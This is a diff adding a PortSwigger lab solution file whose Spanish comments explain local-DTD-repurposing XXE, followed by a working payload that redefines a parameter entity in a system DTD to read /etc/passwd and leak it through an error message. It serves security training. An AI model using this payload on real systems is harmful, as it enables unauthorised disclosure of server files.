@@ -1,0 +1,32 @@
+<!--
+  PortSwigger Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+
+  Body para Repeater. Mantener Content-Type: application/xml.
+
+  Tecnica: "Local DTD Repurposing" (Yunusov & Osipov 2018). El lab no provee
+  exploit server y el firewall bloquea egress, asi que no puedes hostear DTD
+  remoto. La salida: usar un DTD que YA EXISTE en el filesystem del server y
+  abusar redefinicion de parameter entities.
+
+  Path del DTD local (provisto como hint en la pagina del lab):
+    /usr/share/yelp/dtd/docbookx.dtd
+  Parameter entity a redefinir:
+    %ISOamso
+
+  Mecanica:
+  1. Declaramos %ISOamso con nuestra cadena maliciosa antes de cargar el DTD local.
+  2. Cargamos el DTD local con %local_dtd;.
+  3. El DTD local intenta declarar %ISOamso (su version benigna), pero el parser
+     usa la primera definicion que vio (la nuestra). Cuando docbookx.dtd
+     referencia %ISOamso; internamente, expande NUESTRA cadena.
+  4. Nuestra cadena: lee /etc/passwd, lo concatena en path inexistente, dispara
+     FileNotFoundException con el contenido del archivo en el mensaje.
+
+  GOTCHA CRITICO: usar &#x27; (entidad numerica de ') y NO &apos;.
+  En contexto de DTD entity values nested, parsers Java estrictos (Xerces) solo
+  expanden entidades numericas (&#xHH;); las nombradas (&apos;, &quot;, &amp;)
+  pueden quedar literales y romper la sintaxis del SYSTEM identifier. Mismo para
+  &#x22; vs &quot;. La tecnica canonica usa siempre numericas.
+-->
+<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
